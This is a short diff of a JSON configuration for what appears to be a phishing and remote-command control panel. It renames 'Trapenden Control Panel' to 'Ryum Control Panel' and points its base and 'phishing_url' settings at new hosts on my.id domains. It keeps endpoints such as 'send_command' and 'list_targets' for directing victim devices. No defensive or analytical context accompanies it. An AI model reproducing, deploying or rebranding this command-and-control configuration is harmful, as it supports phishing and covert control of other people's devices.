@@ -1,8 +1,8 @@
 {
-  "base_url": "http://jscloud.my.id:2002",
-  "phishing_url": "http://jscloud.my.id:2004",
-  "version": "5.0.0",
-  "app_name": "Trapenden Control Panel",
+  "base_url": "http://prastzyy.miuntech.my.id:2002",
+  "phishing_url": "http://prastzyy.miuntech.my.id:2002",
+  "version": "2.0.0",
+  "app_name": "Ryum Control Panel",
   "endpoints": {
     "send_command": "/api/send-command",
     "list_targets": "/api/list-targets",
